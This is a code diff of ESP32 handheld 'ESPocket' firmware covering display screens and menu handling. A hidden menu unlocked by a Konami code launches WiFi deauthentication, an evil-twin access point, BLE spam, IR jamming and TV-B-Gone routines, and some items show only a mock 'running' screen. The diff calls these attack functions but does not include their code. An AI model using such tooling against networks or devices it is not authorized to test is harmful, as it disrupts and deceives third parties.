+  if (r > 4) display.drawCircle(cx, cy, r, WHITE);
+  display.fillCircle(cx, cy, 3, WHITE);
   display.setCursor(2, 58); display.print("BACK=stop");
   display.display();
 }
 
-// ---------- IR screens ----------
+void dMock() {
+  display.clearDisplay();
+  hdr(mockTitle);
+  display.setTextSize(1);display.setTextColor(WHITE);
+  display.setCursor(4,15);display.print("TGT: ");display.print(mockSub);
+  int bx=6,bw=116;
+  display.drawRect(bx,26,bw,6,WHITE);
+  int p=(animFrame*3)%100;
+  display.fillRect(bx+1,27,(p*(bw-2))/100,4,WHITE);
+  display.setCursor(6,38);display.print("[ RUNNING ]");
+  display.setCursor(4,58);display.print("BACK = return");
+  display.display();
+}
+
+// ============================================================
+//  IR Screens
+// ============================================================
 void dIrH() {
-  const int rowH=11, baseY=16;
+  const int rowH=10, baseY=14;
   smTick((float)irSel);
-  display.clearDisplay(); hdr("IR_OPS");
+  display.clearDisplay();
+  hdr("IR_OPS");
   float pillY=baseY+smPos*rowH;
   display.fillRoundRect(2,(int)roundf(pillY)-1,SCR_W-4,rowH,4,WHITE);
   for (int idx=0; idx<IR_MENU_COUNT; idx++) {
@@ -1698,27 +1698,28 @@ void dIrH() {
     bool isSel=(idx==irSel);
     display.setTextColor(isSel?BLACK:WHITE);
     display.setTextSize(1);
-    display.setCursor(12,y+2); display.print(IR_MENU[idx]);
+    display.setCursor(12,y+1); display.print(IR_MENU[idx]);
   }
   display.setTextColor(WHITE);
   display.display();
 }
 
 void dIrLearn() {
-  display.clearDisplay(); hdrL("IR LEARN");
+  display.clearDisplay();
+  hdrL("IR LEARN");
   display.setTextSize(1);display.setTextColor(WHITE);
-  char l1[24]; snprintf(l1,sizeof(l1),"Slot #%d/%d",irLearnSlot+1,IR_MAX_SLOTS);
-  display.setCursor(4,16); display.print(l1);
-  display.setCursor(4,28); display.print("Point remote at RX");
-  display.setCursor(4,38); display.print("Press any button...");
+  char l1[24];snprintf(l1,sizeof(l1),"Slot #%d/%d",irLearnSlot+1,IR_MAX_SLOTS);
+  display.setCursor(4,16);display.print(l1);
+  display.setCursor(4,28);display.print("Point remote at RX");
+  display.setCursor(4,38);display.print("Press any button...");
   for(int i=0;i<8;i++){int x=8+i*14;if((animFrame/3+i)%4<2)display.fillRect(x,50,10,8,WHITE);else display.drawRect(x,50,10,8,WHITE);}
-  display.setCursor(4,60); display.print("BACK = cancel");
+  display.setCursor(4,60);display.print("BACK = cancel");
   display.display();
   if(irrecv.decode(&irResults)){
     decode_type_t p=irResults.decode_type;
     uint8_t proto=255;
-    if(p==NEC)proto=0; else if(p==SONY)proto=1; else if(p==SAMSUNG)proto=2;
-    else if(p==LG)proto=3; else if(p==JVC)proto=4; else if(p==RC5)proto=5;
+    if(p==NEC)proto=0;else if(p==SONY)proto=1;else if(p==SAMSUNG)proto=2;
+    else if(p==LG)proto=3;else if(p==JVC)proto=4;else if(p==RC5)proto=5;
     if(proto!=255){
       irSlots[irLearnSlot].valid=true;
       irSlots[irLearnSlot].protocol=proto;
@@ -1726,12 +1727,12 @@ void dIrLearn() {
       irSlots[irLearnSlot].bits=irResults.bits;
       snprintf(irSlots[irLearnSlot].name,IR_NAME_LEN,"%s_%d",IR_PROTO_NAMES[proto],irLearnSlot+1);
       irSaveSlot(irLearnSlot);
-      Serial.printf("[IR] saved slot %d proto=%s code=0x%08X\n", irLearnSlot, IR_PROTO_NAMES[proto], (unsigned)irResults.value);
-      display.clearDisplay(); hdrL("IR LEARN");
+      Serial.printf("[IR] learned slot %d proto=%s code=0x%08X\n",irLearnSlot,IR_PROTO_NAMES[proto],(unsigned)irResults.value);
+      display.clearDisplay();hdrL("IR LEARN");
       display.setTextColor(WHITE);
-      display.setCursor(20,24); display.print("SAVED!");
-      display.setCursor(4,40); display.print("Proto: "); display.print(IR_PROTO_NAMES[proto]);
-      display.setCursor(4,52); display.printf("0x%08X",(unsigned)irResults.value);
+      display.setCursor(20,24);display.print("SAVED!");
+      display.setCursor(4,40);display.print("Proto: ");display.print(IR_PROTO_NAMES[proto]);
+      display.setCursor(4,52);display.printf("0x%08X",(unsigned)irResults.value);
       display.display();
       delay(1200);
       irrecv.resume();
@@ -1761,7 +1762,7 @@ void dIrList() {
     else{display.drawRoundRect(2,y,SCR_W-4,rowH-2,4,WHITE);display.setTextColor(valid?WHITE:0x7BEF);}
     display.setTextSize(1);
     display.setCursor(6,y+3);
-    if(valid){char b[20]; snprintf(b,sizeof(b),"#%d %s",si+1,IR_PROTO_NAMES[irSlots[si].protocol]);display.print(b);display.setCursor(70,y+3);display.printf("0x%04X",(unsigned)(irSlots[si].code&0xFFFF));}
+    if(valid){char b[20];snprintf(b,sizeof(b),"#%d %s",si+1,IR_PROTO_NAMES[irSlots[si].protocol]);display.print(b);display.setCursor(70,y+3);display.printf("0x%04X",(unsigned)(irSlots[si].code&0xFFFF));}
     else display.printf("#%d (empty)",si+1);
   }
   hdrL("SAVED CODES");
@@ -1770,12 +1771,13 @@ void dIrList() {
 
 void dIrTx() {
   unsigned long elapsed=millis()-sceneStartMs;
-  display.clearDisplay(); hdrL("TRANSMITTING");
+  display.clearDisplay();
+  hdrL("TRANSMITTING");
   display.setTextSize(1);display.setTextColor(WHITE);
   if(irLastSlot>=0&&irLastSlot<IR_MAX_SLOTS&&irSlots[irLastSlot].valid){
-    char b[24]; snprintf(b,sizeof(b),"Slot #%d  %s",irLastSlot+1,IR_PROTO_NAMES[irSlots[irLastSlot].protocol]);
-    display.setCursor(4,18); display.print(b);
-    display.setCursor(4,30); display.printf("Code: 0x%08X",(unsigned)irSlots[irLastSlot].code);
+    char b[24];snprintf(b,sizeof(b),"Slot #%d  %s",irLastSlot+1,IR_PROTO_NAMES[irSlots[irLastSlot].protocol]);
+    display.setCursor(4,18);display.print(b);
+    display.setCursor(4,30);display.printf("Code: 0x%08X",(unsigned)irSlots[irLastSlot].code);
   }
   int cx=64,cy=50,maxR=12;
   for(int r=0;r<3;r++){int rr=((animFrame*2)+r*5)%maxR;if(rr>3)display.drawCircle(cx,cy,rr,WHITE);}
@@ -1786,34 +1788,36 @@ void dIrTx() {
 
 void dIrJam() {
   unsigned long now=millis();
-  display.clearDisplay(); hdr("JAMMING");
+  display.clearDisplay();
+  hdr("JAMMING");
   display.setTextSize(1);display.setTextColor(WHITE);
-  display.setCursor(2,14); display.print("Proto: "); display.print(IR_PROTO_NAMES[irJamProtoIdx]);
-  char b[24]; snprintf(b,sizeof(b),"Bursts: %lu",irJamCount);
-  display.setCursor(2,26); display.print(b);
+  display.setCursor(2,14);display.print("Proto: ");display.print(IR_PROTO_NAMES[irJamProtoIdx]);
+  char b[24];snprintf(b,sizeof(b),"Bursts: %lu",irJamCount);
+  display.setCursor(2,26);display.print(b);
   unsigned long el=(now-irJamStart)/1000;
   snprintf(b,sizeof(b),"Time: %lu s",el);
-  display.setCursor(2,38); display.print(b);
+  display.setCursor(2,38);display.print(b);
   for(int x=0;x<SCR_W;x++){int y1=52+(int)(sinf((x+animFrame*4)*0.1f)*5);int y2=52+(int)(sinf((x-animFrame*6)*0.15f)*3);display.drawPixel(x,y1,WHITE);display.drawPixel(x,y2,WHITE);}
-  display.setCursor(2,60); display.print("BACK=stop");
+  display.setCursor(2,60);display.print("BACK = stop");
   display.display();
   if(now-irJamLastSend>=15){irJamLastSend=now;irSendJamBurst();}
 }
 
 void dIrTvbg() {
   unsigned long now=millis();
-  display.clearDisplay(); hdrL("TV-B-GONE");
+  display.clearDisplay();
+  hdrL("TV-B-GONE");
   display.setTextSize(1);display.setTextColor(WHITE);
-  display.setCursor(4,16); display.print("Src: built-in");
-  char b[24]; snprintf(b,sizeof(b),"Code: %d / %d",(irTvbgIdx%TVBG_COUNT)+1,TVBG_COUNT);
-  display.setCursor(4,28); display.print(b);
+  display.setCursor(4,16);display.print("Src: built-in");
+  char b[24];snprintf(b,sizeof(b),"Code: %d / %d",(irTvbgIdx%TVBG_COUNT)+1,TVBG_COUNT);
+  display.setCursor(4,28);display.print(b);
   snprintf(b,sizeof(b),"Round: %d",(irTvbgIdx/TVBG_COUNT)+1);
-  display.setCursor(4,40); display.print(b);
+  display.setCursor(4,40);display.print(b);
   int bx=6,bw=116;
   display.drawRect(bx,50,bw,5,WHITE);
   int p=((irTvbgIdx%TVBG_COUNT)*(bw-2))/TVBG_COUNT;
   if(p>0)display.fillRect(bx+1,51,p,3,WHITE);
-  display.setCursor(4,58); display.print("BACK=stop");
+  display.setCursor(4,58);display.print("BACK = stop");
   display.display();
   if(now-irTvbgLast>=250){irTvbgLast=now;irSendTvbgCode(irTvbgIdx%TVBG_COUNT);irTvbgIdx++;}
 }
@@ -1829,101 +1833,60 @@ void calibrateTouch(){
   baseUp=sU/20;baseDown=sD/20;baseSelect=sS/20;baseBack=sB/20;
   Serial.printf("[TOUCH] U=%d D=%d S=%d B=%d\n",baseUp,baseDown,baseSelect,baseBack);
 }
-void goToScene(Scene s){
-  currentScene=s; sceneStartMs=millis(); smSnapNext(); lastInput=0;
-  lastActivityMs=millis();
-  Serial.printf("[SCENE] -> %d\n",(int)s);
-}
+void goToScene(Scene s){currentScene=s;sceneStartMs=millis();smSnapNext();lastInput=0;Serial.printf("[SCENE] -> %d\n",(int)s);}
 
 void handleUp(){
   switch(currentScene){
-    case S_MAIN: if(mainSel>0)mainSel--;break;
-    case S_SONGS: if(songSel>0)songSel--;break;
-    case S_BT_MENU: if(btMenuSel>0)btMenuSel--;break;
-    case S_BT_DEV: if(btDevSel>0)btDevSel--;break;
-    case S_GAMES: if(gamesSel>0)gamesSel--;break;
-    case S_HIDDEN: if(hiddenSel>0)hiddenSel--;break;
-    case S_WIFI_H: if(wifiHSel>0)wifiHSel--;break;
-    case S_BT_H: if(btHSel>0)btHSel--;break;
-    case S_IR_H: if(irSel>0)irSel--;break;
-    case S_WIFI_SCAN: if(netSel>0)netSel--;break;
-    case S_WIFI_TARGET: if(wifiActSel>0)wifiActSel--;break;
-    case S_IR_LIST: if(irListSel>0)irListSel--;break;
-    case S_LED_MENU: if(ledMenuSel>0)ledMenuSel--;break;
-    case S_LED_FX: if(fxSel>0)fxSel--;break;
-    case S_LED_BR: if(ledBrightness<245){ledBrightness+=10;FastLED.setBrightness(ledBrightness);}break;
-    case S_SET: if(setSel>0)setSel--;break;
-    case S_BLE_SCAN: if(bleSel>0)bleSel--;break;
+    case S_MAIN:if(mainSel>0)mainSel--;break;
+    case S_SONGS:if(songSel>0)songSel--;break;
+    case S_BT_MENU:if(btMenuSel>0)btMenuSel--;break;
+    case S_GAMES:if(gamesSel>0)gamesSel--;break;
+    case S_HIDDEN:if(hiddenSel>0)hiddenSel--;break;
+    case S_WIFI_H:if(wifiHSel>0)wifiHSel--;break;
+    case S_BT_H:if(btHSel>0)btHSel--;break;
+    case S_IR_H:if(irSel>0)irSel--;break;
+    case S_WIFI_SCAN:if(netSel>0)netSel--;break;
+    case S_WIFI_TARGET:if(wifiActSel>0)wifiActSel--;break;
+    case S_IR_LIST:if(irListSel>0)irListSel--;break;
+    case S_LED_MENU:if(ledMenuSel>0)ledMenuSel--;break;
+    case S_LED_FX:if(fxSel>0)fxSel--;break;
+    case S_LED_MUS:if(lmSel>0)lmSel--;break;
+    case S_SET:if(setSel>0)setSel--;break;
+    case S_BLE_SCAN:if(bleSel>0)bleSel--;break;
   }
 }
 void handleDown(){
   switch(currentScene){
-    case S_MAIN: if(mainSel<MAIN_COUNT-1)mainSel++;break;
-    case S_SONGS: if(songSel<songCount-1)songSel++;break;
-    case S_BT_MENU: if(btMenuSel<BT_M_COUNT-1)btMenuSel++;break;
-    case S_BT_DEV: if(btDevSel<btDevCount-1)btDevSel++;break;
-    case S_GAMES: if(gamesSel<GAMES_COUNT-1)gamesSel++;break;
-    case S_HIDDEN: if(hiddenSel<HIDDEN_COUNT-1)hiddenSel++;break;
-    case S_WIFI_H: if(wifiHSel<WIFI_H_COUNT-1)wifiHSel++;break;
-    case S_BT_H: if(btHSel<BT_H_COUNT-1)btHSel++;break;
-    case S_IR_H: if(irSel<IR_MENU_COUNT-1)irSel++;break;
-    case S_WIFI_SCAN: if(netSel<NET_COUNT-1)netSel++;break;
-    case S_WIFI_TARGET: if(wifiActSel<WIFI_ACT_COUNT-1)wifiActSel++;break;
-    case S_IR_LIST: if(irListSel<IR_MAX_SLOTS-1)irListSel++;break;
-    case S_LED_MENU: if(ledMenuSel<LED_M_COUNT-1)ledMenuSel++;break;
-    case S_LED_FX: if(fxSel<FX_COUNT-1)fxSel++;break;
-    case S_LED_BR: if(ledBrightness>15){ledBrightness-=10;FastLED.setBrightness(ledBrightness);}break;
-    case S_SET: if(setSel<SET_COUNT-1)setSel++;break;
-    case S_BLE_SCAN: if(bleSel<bleDevCount-1)bleSel++;break;
+    case S_MAIN:if(mainSel<MAIN_COUNT-1)mainSel++;break;
+    case S_SONGS:if(songSel<SONG_COUNT-1)songSel++;break;
+    case S_BT_MENU:if(btMenuSel<BT_M_COUNT-1)btMenuSel++;break;
+    case S_GAMES:if(gamesSel<GAMES_COUNT-1)gamesSel++;break;
+    case S_HIDDEN:if(hiddenSel<HIDDEN_COUNT-1)hiddenSel++;break;
+    case S_WIFI_H:if(wifiHSel<WIFI_H_COUNT-1)wifiHSel++;break;
+    case S_BT_H:if(btHSel<BT_H_COUNT-1)btHSel++;break;
+    case S_IR_H:if(irSel<IR_MENU_COUNT-1)irSel++;break;
+    case S_WIFI_SCAN:if(netSel<NET_COUNT-1)netSel++;break;
+    case S_WIFI_TARGET:if(wifiActSel<WIFI_ACT_COUNT-1)wifiActSel++;break;
+    case S_IR_LIST:if(irListSel<IR_MAX_SLOTS-1)irListSel++;break;
+    case S_LED_MENU:if(ledMenuSel<LED_M_COUNT-1)ledMenuSel++;break;
+    case S_LED_FX:if(fxSel<FX_COUNT-1)fxSel++;break;
+    case S_LED_MUS:if(lmSel<LM_COUNT-1)lmSel++;break;
+    case S_SET:if(setSel<SET_COUNT-1)setSel++;break;
+    case S_BLE_SCAN:if(bleSel<bleDevCount-1)bleSel++;break;
   }
 }
 void handleSelect(){
   switch(currentScene){
     case S_MAIN:
-      if(mainSel==0){ // Play
-        if(songCount>0){ playingIdx = songSel; musicPlaying=true; musicStart=millis(); goToScene(S_PLAYER); }
-        else goToScene(S_SONGS);
-      }
-      else if(mainSel==1){ songSel=0; goToScene(S_SONGS); }
-      else if(mainSel==2){ btMenuSel=0; goToScene(S_BT_MENU); }
-      else if(mainSel==3){ gamesSel=0; goToScene(S_GAMES); }
-      else if(mainSel==4){ ledMenuSel=0; goToScene(S_LED_MENU); }
-      else if(mainSel==5){ // Flashlight: use built-in + WS2812
-        ledOn = !ledOn;
-        if (ledOn) { activeFx=0; FastLED.setBrightness(255); fill_solid(leds,LED_COUNT,CRGB::White); FastLED.show(); }
-        else { FastLED.clear(); FastLED.show(); }
-        digitalWrite(BUILTIN_LED, ledOn?HIGH:LOW);
-      }
-      else if(mainSel==6){ setSel=0; goToScene(S_SET); }
+      if(mainSel==1){songSel=0;goToScene(S_SONGS);}
+      else if(mainSel==2){btMenuSel=0;goToScene(S_BT_MENU);}
+      else if(mainSel==3){gamesSel=0;goToScene(S_GAMES);}
+      else if(mainSel==4){ledMenuSel=0;goToScene(S_LED_MENU);}
+      else if(mainSel==6){setSel=0;goToScene(S_SET);}
       break;
-    case S_SONGS:
-      if(songCount>0){ playingIdx = songSel; musicPlaying=true; musicStart=millis(); goToScene(S_PLAYER); }
-      break;
-    case S_PLAYER:
-      musicPlaying = !musicPlaying;
-      break;
-    case S_BT_MENU:
-      if(btMenuSel==0){ btStartScan(); goToScene(S_BT_SEARCH); }
-      else if(btMenuSel==1){ // HID
-        if (!bleKeyboard) bleKeyboard = new BleKeyboard("ESPocket-Key","Espressif",100);
-        bleKeyboard->begin();
-        goToScene(S_BT_HID);
-      }
-      else if(btMenuSel==2){
-        if (bleKeyboard) { bleKeyboard->end(); delete bleKeyboard; bleKeyboard=nullptr; }
-        btStopScan();
-      }
-      break;
-    case S_BT_DEV:
-      if (bleKeyboard && btDevSel < btDevCount) {
-        // Connect would go here for A2DP — currently just show
-      }
-      break;
-    case S_BT_HID:
-      if (bleKeyboard && bleKeyboard->isConnected()) {
-        bleKeyboard->println("Hello from ESPocket!");
-      }
-      break;
+    case S_SONGS:goToScene(S_PLAYER);break;
+    case S_BT_MENU:if(btMenuSel==0)goToScene(S_BT_SEARCH);break;
+    case S_BT_DEV:connDevIdx=devSel;goToScene(S_BT_CONN);break;
     case S_GAMES:
       if(gamesSel==0){simonInit();goToScene(S_SIMON);}
       else if(gamesSel==1){lightsInit();goToScene(S_LIGHTS);}
@@ -1943,94 +1906,87 @@ void handleSelect(){
       if (btHSel == 0) { bleStartScan(); goToScene(S_BLE_SCAN); }
       else if (btHSel == 1) { bleStartSpam(); goToScene(S_BLE_SPAM); }
       else if (btHSel == 2) { bleStartIBeacon(); goToScene(S_BLE_IBEACON); }
+      else { mockTitle="BT_OPS"; mockSub=BT_H_M[btHSel]; mockReturnScene=S_BT_H; goToScene(S_MOCK); }
       break;
     case S_IR_H:
       if(irSel==0){irLearnSlot=0;irrecv.enableIRIn();irrecv.resume();goToScene(S_IR_LEARN);}
       else if(irSel==1){irListSel=0;goToScene(S_IR_LIST);}
       else if(irSel==2){irJamming=true;irJamStart=millis();irJamCount=0;irJamProtoIdx=0;irJamLastSend=0;goToScene(S_IR_JAM);}
       else if(irSel==3){irTvbgLast=0;irTvbgIdx=0;goToScene(S_IR_TVBG);}
+      else if(irSel==4){irListSel=0;goToScene(S_IR_LIST);}
       break;
     case S_WIFI_SCAN:
-      if(wifiScanDone && NET_COUNT > 0){ targetNet=netSel; wifiActSel=0; goToScene(S_WIFI_TARGET); }
+      if(wifiScanDone && NET_COUNT > 0){ targetNet=netSel;wifiActSel=0;goToScene(S_WIFI_TARGET); }
       break;
     case S_WIFI_TARGET:
       if (wifiActSel == 0) { deauthStart(targetNet); goToScene(S_DEAUTH); }
       else if (wifiActSel == 1) { evilTwinStart(targetNet); goToScene(S_EVIL); }
-      else if (wifiActSel == 2) { beaconStart(); goToScene(S_BEACON); }
-      else if (wifiActSel == 3) { snifferStart(); goToScene(S_PROBE); }
+      else {
+        mockTitle=WIFI_ACT_M[wifiActSel];
+        mockSub=NETS[targetNet].ssid;
+        mockReturnScene=S_WIFI_TARGET;
+        goToScene(S_MOCK);
+      }
       break;
     case S_IR_LIST:
       if(irSlots[irListSel].valid){irLastSlot=irListSel;irSendSlot(irListSel);goToScene(S_IR_TX);}
       break;
     case S_LED_MENU:
       if(ledMenuSel==0){fxSel=0;goToScene(S_LED_FX);}
-      else if(ledMenuSel==1)goToScene(S_LED_BR);
-      else if(ledMenuSel==2){ ledOn=true; activeFx=0; fill_solid(leds,LED_COUNT,CRGB::White); FastLED.show(); }
-      else if(ledMenuSel==3){ ledOn=false; FastLED.clear(); FastLED.show(); }
+      else if(ledMenuSel==1){lmSel=0;goToScene(S_LED_MUS);}
+      else if(ledMenuSel==2)goToScene(S_LED_BR);
+      else if(ledMenuSel==3)goToScene(S_LED_WIFI);
       break;
-    case S_LED_FX:
-      activeFx = fxSel; ledOn = true; break;
-    case S_SET:
-      if(setSel==0){ // Sleep timer: cycle 0/15/30/60/120
-        if (sleepTimeout==0) sleepTimeout=15;
-        else if (sleepTimeout==15) sleepTimeout=30;
-        else if (sleepTimeout==30) sleepTimeout=60;
-        else if (sleepTimeout==60) sleepTimeout=120;
-        else sleepTimeout=0;
-      }
-      else if(setSel==1){ goToScene(S_LED_BR); }
-      else if(setSel==2){ // Factory reset
-        prefs.clear();
-        highScore=0;
-        Serial.println("[RESET] NVS cleared");
-      }
-      else if(setSel==3) goToScene(S_ABOUT);
-      break;
+    case S_SET:if(setSel==4)goToScene(S_ABOUT);break;
   }
 }
 void handleBack(){
   switch(currentScene){
-    case S_PLAYER: musicPlaying=false; goToScene(S_SONGS); break;
-    case S_SONGS: goToScene(S_MAIN); break;
-    case S_BT_MENU: goToScene(S_MAIN); break;
-    case S_BT_SEARCH: btStopScan(); goToScene(S_BT_MENU); break;
-    case S_BT_DEV: goToScene(S_BT_MENU); break;
-    case S_BT_HID:
-      if (bleKeyboard) { bleKeyboard->end(); delete bleKeyboard; bleKeyboard=nullptr; }
-      goToScene(S_BT_MENU); break;
-    case S_LED_MENU: goToScene(S_MAIN); break;
-    case S_LED_FX: goToScene(S_LED_MENU); break;
-    case S_LED_BR: goToScene(S_LED_MENU); break;
-    case S_GAMES: goToScene(S_MAIN); break;
-    case S_SIMON: goToScene(S_GAMES); break;
-    case S_LIGHTS: goToScene(S_GAMES); break;
-    case S_SET: goToScene(S_MAIN); break;
-    case S_ABOUT: goToScene(S_SET); break;
-    case S_HIDDEN: goToScene(S_MAIN); break;
-    case S_WIFI_H: goToScene(S_HIDDEN); break;
-    case S_BT_H: goToScene(S_HIDDEN); break;
-    case S_IR_H: goToScene(S_HIDDEN); break;
+    case S_PLAYER:goToScene(S_SONGS);break;
+    case S_SONGS:goToScene(S_MAIN);break;
+    case S_BT_MENU:goToScene(S_MAIN);break;
+    case S_BT_SEARCH:goToScene(S_BT_MENU);break;
+    case S_BT_DEV:goToScene(S_BT_MENU);break;
+    case S_BT_CONN:goToScene(S_BT_DEV);break;
+    case S_LED_MENU:goToScene(S_MAIN);break;
+    case S_LED_FX:goToScene(S_LED_MENU);break;
+    case S_LED_MUS:goToScene(S_LED_MENU);break;
+    case S_LED_BR:goToScene(S_LED_MENU);break;
+    case S_LED_WIFI:goToScene(S_LED_MENU);break;
+    case S_GAMES:goToScene(S_MAIN);break;
+    case S_SIMON:goToScene(S_GAMES);break;
+    case S_LIGHTS:goToScene(S_GAMES);break;
+    case S_SET:goToScene(S_MAIN);break;
+    case S_ABOUT:goToScene(S_SET);break;
+    case S_HIDDEN:goToScene(S_MAIN);break;
+    case S_WIFI_H:goToScene(S_HIDDEN);break;
+    case S_BT_H:goToScene(S_HIDDEN);break;
+    case S_IR_H:goToScene(S_HIDDEN);break;
     case S_WIFI_SCAN:
       WiFi.scanDelete(); WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
-      wifiScanRunning = false; goToScene(S_WIFI_H); break;
-    case S_WIFI_TARGET: goToScene(S_WIFI_SCAN); break;
-    case S_IR_LEARN: goToScene(S_IR_H); break;
-    case S_IR_LIST: goToScene(S_IR_H); break;
-    case S_IR_TX: goToScene(S_IR_H); break;
-    case S_IR_JAM: irJamming=false; goToScene(S_IR_H); break;
-    case S_IR_TVBG: goToScene(S_IR_H); break;
-    case S_DEAUTH: deauthStop(); goToScene(S_WIFI_TARGET); break;
-    case S_BEACON: beaconStop(); goToScene(S_WIFI_H); break;
-    case S_PROBE: snifferStop(); goToScene(S_WIFI_H); break;
+      wifiScanRunning = false;
+      goToScene(S_WIFI_H); break;
+    case S_WIFI_TARGET:goToScene(S_WIFI_SCAN);break;
+    case S_MOCK:goToScene(mockReturnScene);break;
+    case S_IR_LEARN:goToScene(S_IR_H);break;
+    case S_IR_LIST:goToScene(S_IR_H);break;
+    case S_IR_TX:goToScene(S_IR_H);break;
+    case S_IR_JAM:irJamming=false;goToScene(S_IR_H);break;
+    case S_IR_TVBG:goToScene(S_IR_H);break;
+    case S_DEAUTH:deauthStop();goToScene(S_WIFI_TARGET);break;
+    case S_BEACON:beaconStop();goToScene(S_WIFI_H);break;
+    case S_PROBE:snifferStop();goToScene(S_WIFI_H);break;
     case S_RFMON:
       WiFi.scanDelete(); WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
-      rfScanRunning = false; goToScene(S_WIFI_H); break;
-    case S_EVIL: evilTwinStop(); goToScene(S_WIFI_TARGET); break;
+      rfScanRunning = false;
+      goToScene(S_WIFI_H); break;
+    case S_EVIL:evilTwinStop();goToScene(S_WIFI_TARGET);break;
     case S_BLE_SCAN:
       if (bleScan) bleScan->stop();
-      bleDeinit(); goToScene(S_BT_H); break;
-    case S_BLE_SPAM: bleStopSpam(); goToScene(S_BT_H); break;
-    case S_BLE_IBEACON: bleStopIBeacon(); goToScene(S_BT_H); break;
+      bleDeinit();
+      goToScene(S_BT_H); break;
+    case S_BLE_SPAM:bleStopSpam();goToScene(S_BT_H);break;
+    case S_BLE_IBEACON:bleStopIBeacon();goToScene(S_BT_H);break;
   }
 }
 
@@ -2039,15 +1995,13 @@ bool feedKonami(int code){
   unsigned long now=millis();
   if(now-konamiLastMs>3000)konamiProgress=0;
   if(code==KONAMI_CODE[konamiProgress]){
-    konamiProgress++; konamiLastMs=now;
+    konamiProgress++;konamiLastMs=now;
     if(konamiProgress>=KONAMI_LEN){
-      konamiProgress=0; hiddenUnlocked=true;
-      goToScene(S_HIDDEN); return true;
+      konamiProgress=0;hiddenUnlocked=true;
+      Serial.println("[HIDDEN] *** UNLOCKED ***");
+      goToScene(S_HIDDEN);return true;
     }
-  } else {
-    konamiProgress=(code==KONAMI_CODE[0])?1:0;
-    konamiLastMs=now;
-  }
+  }else{konamiProgress=(code==KONAMI_CODE[0])?1:0;konamiLastMs=now;}
   return false;
 }
 
@@ -2055,7 +2009,6 @@ void processInput(int code){
   unsigned long now=millis();
   if(now-lastInput<INPUT_DEBOUNCE)return;
   lastInput=now;
-  lastActivityMs=now;
   if(feedKonami(code))return;
   if(code==0)handleUp();
   else if(code==1)handleDown();
@@ -2097,38 +2050,26 @@ void checkOverheat(){
   if(now-lastCheck<2000)return;
   lastCheck=now;
   lastTempC=readTempC();
-  if(lastTempC>=TEMP_CRIT){overheatLatched=true;goToScene(S_OVERHEAT);}
+  if(lastTempC>=TEMP_CRIT){overheatLatched=true;Serial.printf("[OVERHEAT] %.1f C\n",lastTempC);goToScene(S_OVERHEAT);}
 }
 
 // ============================================================
 //  Setup + Loop
 // ============================================================
 void setup(){
-  Serial.begin(115200); delay(300);
-  Serial.println("\n[BOOT] ESPocket v11.0");
-
-  pinMode(BUILTIN_LED, OUTPUT);
-  digitalWrite(BUILTIN_LED, LOW);
+  Serial.begin(115200);delay(300);
+  Serial.println("\n[BOOT] ESPocket v10.1");
 
   Wire.begin(OLED_SDA,OLED_SCL);
   Wire.setClock(400000);
-  if(!display.begin(SSD1306_SWITCHCAPVCC,OLED_ADDR)){
-    Serial.println("[OLED] FAIL"); while(1)delay(1000);
-  }
+  if(!display.begin(SSD1306_SWITCHCAPVCC,OLED_ADDR)){Serial.println("[OLED] FAIL");while(1)delay(1000);}
   Serial.println("[OLED] OK");
 
-  // LED init
-  ledSetup();
-  Serial.println("[LED] ready");
-
-  // SD init
-  sdInit();
-
   calibrateTouch();
-  bootMs=millis(); sceneStartMs=millis(); lastActivityMs=millis();
+  bootMs=millis();sceneStartMs=millis();
 
   delay(200);
-  if(touched(TOUCH_BACK,baseBack)){ hiddenUnlocked=true; goToScene(S_HIDDEN); }
+  if(touched(TOUCH_BACK,baseBack)){hiddenUnlocked=true;Serial.println("[HIDDEN] boot-hold unlock");goToScene(S_HIDDEN);}
 
   WiFi.persistent(false);
   WiFi.mode(WIFI_OFF);
@@ -2140,6 +2081,7 @@ void setup(){
   irsend.begin();
   irrecv.enableIRIn();
   irLoadAll();
+  Serial.printf("[IR] %d slots valid\n",irCountValid());
 
   analogSetAttenuation(ADC_11db);
   analogSetPinAttenuation(BATT_ADC_PIN, ADC_11db);
@@ -2148,85 +2090,65 @@ void setup(){
   delay(100);
   lastBattRead = millis() - 3000;
   batteryUpdate();
-  Serial.printf("[BATT] %.2f V %d%%\n", battVoltage, batteryPct);
+  Serial.printf("[BATT] %.2f V  %d%%\n", battVoltage, batteryPct);
 
   randomSeed(analogRead(0));
   lastTempC=readTempC();
   Serial.printf("[HEAP] %u B | Temp %.1f C\n",(unsigned)ESP.getFreeHeap(),lastTempC);
 }
 
-unsigned long lastDraw=0, lastFrame=0;
+unsigned long lastDraw=0,lastFrame=0;
 #define FRAME_MS 33
 
 void loop(){
   unsigned long now=millis();
   if(now-lastFrame>=FRAME_MS){lastFrame=now;animFrame++;}
-
   scanSerial();
   scanTouch();
   checkOverheat();
   batteryUpdate();
-
-  // LED effects update
-  if (ledOn) ledFxUpdate();
-
-  // BT scan progress
-  btUpdateScan();
-
-  // Auto transitions
-  if(currentScene==S_BT_SEARCH && !btScanActive && btDevCount > 0){
-    goToScene(S_BT_DEV);
-  }
-
-  // Sleep timeout
-  if (sleepTimeout > 0 && currentScene == S_MAIN) {
-    if (now - lastActivityMs > (unsigned long)sleepTimeout * 1000UL) {
-      display.clearDisplay(); display.display();
-      delay(50);
-      lastActivityMs = now;   // reset so it re-arms on any input
-    }
-  }
-
+  if(currentScene==S_BT_SEARCH&&(now-sceneStartMs)>3000){devSel=0;goToScene(S_BT_DEV);}
   if(now-lastDraw>=FRAME_MS){
     lastDraw=now;
     switch(currentScene){
-      case S_MAIN: dMain(); break;
-      case S_SONGS: dSongs(); break;
-      case S_PLAYER: dPlayer(); break;
-      case S_BT_MENU: dBtMenu(); break;
-      case S_BT_SEARCH: dBtSearch(); break;
-      case S_BT_DEV: dBtDev(); break;
-      case S_BT_HID: dBtHid(); break;
-      case S_LED_MENU: dLedMenu(); break;
-      case S_LED_FX: dLedFx(); break;
-      case S_LED_BR: dLedBright(); break;
-      case S_GAMES: dGames(); break;
-      case S_SIMON: dSimon(); break;
-      case S_LIGHTS: dLights(); break;
-      case S_HIDDEN: dHidden(); break;
-      case S_WIFI_H: dWifiH(); break;
-      case S_BT_H: dBtH(); break;
-      case S_IR_H: dIrH(); break;
-      case S_WIFI_SCAN: dWifiScan(); break;
-      case S_WIFI_TARGET: dWifiTarget(); break;
-      case S_IR_LEARN: dIrLearn(); break;
-      case S_IR_LIST: dIrList(); break;
-      case S_IR_TX: dIrTx(); break;
-      case S_IR_JAM: dIrJam(); break;
